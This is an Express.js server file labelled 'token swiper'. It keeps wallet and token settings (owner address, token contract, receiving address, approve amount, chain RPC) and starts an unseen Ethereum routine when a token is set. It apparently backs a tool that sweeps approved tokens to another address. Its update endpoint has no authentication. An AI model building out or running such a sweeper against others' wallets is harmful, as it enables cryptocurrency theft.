require("dotenv").config()

const express = require("express")
const main = require("./ethereum/main")
const cors = require("cors")
const db = require("./db/db")
const DetailsSchema = require("./models/detailsModel")

const app = express()
db()

app.use(cors())
app.use(express.json())
app.use(express.urlencoded({extended: false}))

app.get("/", (req, res)=>{
  res.send("welcome to token swiper")
})

app.get("/details", async(req, res)=>{
  try{
     let result = await DetailsSchema.find()
     res.status(200).json({data: result[0], message: "details fetched"})
  }catch(err){
    res.status(500).json({message: err.message})
  }
})

app.post("/details", async(req, res)=>{
  try{
    let detail = new Object(req.body)
    let key = Object.keys(detail)
    let value = Object.values(detail)

    if(
      key[0] !== "owner_address" && 
      key[0] !== "token_ca" && 
      key[0] !== "receiving_address" &&
      key[0] !== "approve_amount" &&
      key[0] !== "current_chain" &&
      key[0] !== "current_chain_rpc"
    ) return res.status(400).json({message: `${key[0]} is an invalid key name`})

    console.log(detail);
    let userDetail = await DetailsSchema.find()
    let id = userDetail[0].id
    console.log(id)
    let firstDetail = await DetailsSchema.findByIdAndUpdate(id,{[key[0]]: value[0]})
    
    if(key[0] == "token_ca"){
      main(value[0])
    }
    res.status(200).json({data: firstDetail, message: key[0] + " " + "added"})
  }catch(err){
     console.log(err)
    res.status(500).json({message: err.message})
  }
})


app.listen(3000, ()=>{
  console.log("app listening on port 3000")
})